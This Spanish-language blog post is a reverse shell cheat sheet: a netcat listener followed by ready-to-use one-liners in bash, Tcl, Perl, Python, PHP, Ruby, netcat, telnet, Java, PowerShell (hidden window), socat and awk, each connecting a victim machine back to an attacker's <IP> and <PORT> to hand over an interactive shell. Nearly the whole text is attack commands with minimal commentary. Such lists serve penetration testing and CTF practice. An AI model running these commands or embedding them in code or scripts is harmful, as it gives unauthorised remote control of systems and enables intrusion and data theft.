---
layout: post
title: Reverse Shells
---

Reverse Shells Cheat Sheet

# Nota
Usualmente podrás reemplazar el `/bin/sh -i` por `cmd.exe` (por ejemplo en las conexiones de netcat)


# Listener
```
nc -l -v -p <PORT>
```


# Bash
Distintas formas de crear un reverse shell. Todas igual de validas. En ocasiones tambien es posible ocupar `/dev/udp/`

```
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done

exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0

0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
```


# TCLsh
En caso de que Bash no funcione.

```
echo 'set s [socket <IP> <PORT>];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```


# Perl
Reverse shell usando /bin/sh

```
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Reverse shell sin /bin/sh

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

Reverse shell en Windows

```
perl -MIO -e "$c=new IO::Socket::INET(PeerAddr,'<IP>:<PORT>');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
```


# Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


# PHP
Reverse shell usando distintas funciones

```
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
 
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
 
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
 
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```


# Ruby
Reverse shell usando /bin/sh

```
ruby -rsocket -e 'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Reverse shell sin /bin/sh

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

Reverse shell en Windows

```
ruby -rsocket -e "c=TCPSocket.new('<IP>','<PORT>');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
```


# Netcat
```
nc <IP> <PORT> -e /bin/sh -i
```


# Telnet
Se realiza doble conexion por telnet (dos puertos), una donde se envia los comandos y la otra donde se recibe la informacion

```
telnet <IP> <PORT1> | /bin/bash | telnet <IP> <PORT2>
```


# Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```


# PowerShell
```
powershell.exe -w hidden -c '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```


# Socat
```
socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
```


# Awk
```
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
